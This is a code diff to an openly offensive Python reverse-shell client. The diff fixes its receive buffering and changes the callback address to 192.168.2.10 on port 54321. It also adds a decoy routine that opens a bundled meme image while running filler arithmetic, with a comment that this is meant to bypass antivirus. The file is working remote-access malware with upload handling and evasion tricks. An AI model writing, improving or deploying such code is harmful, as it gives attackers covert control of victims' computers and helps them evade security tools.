@@ -30,7 +30,7 @@ class reverse_shell:
         recv_data = ""
         while True:
             try:
-                recv_data = self.sock.recv(1024)
+                recv_data += self.sock.recv(1024)
                 return json.loads(recv_data)
             except ValueError:
                 continue
@@ -42,7 +42,7 @@ class reverse_shell:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         while True:
             try:
-                self.sock.connect(("192.168.2.8",54321))
+                self.sock.connect(("192.168.2.10",54321))
                 print "connetion established !"
                 return
             except:
@@ -92,6 +92,27 @@ class reverse_shell:
         if not uploaded_data == "failed":
             with open(command[7:], "wb") as uploaded_file:
                 uploaded_file.write(base64.b64decode(uploaded_data))
+    
+    def set_proxy_img(self):
+        # adding two number calculater 
+        img_path = sys._MEIPASS + "\meme_img.jpg"
+        try:
+            temp = [1,2,3]
+            print "randown list"
+            print temp
+            subprocess.Popen(img_path, shell = True)
+            print "adding two numbers"
+            num = 34
+            num_two = 9
+            num_three = num + num_two
+            print "what is your name"
+
+        except:
+            #doing some unusal activity to bypass antivirus
+            num =77
+            num_two = 777
+            num_three = num + num_two
+            print "i am failing "
 
     def run_rev_shell(self):
         while True:
@@ -128,6 +149,7 @@ class reverse_shell:
 
 
 obj = reverse_shell()
+#obj.set_proxy_img()
 obj.establish_connection()
 #obj.copy_me()
 obj.run_rev_shell()
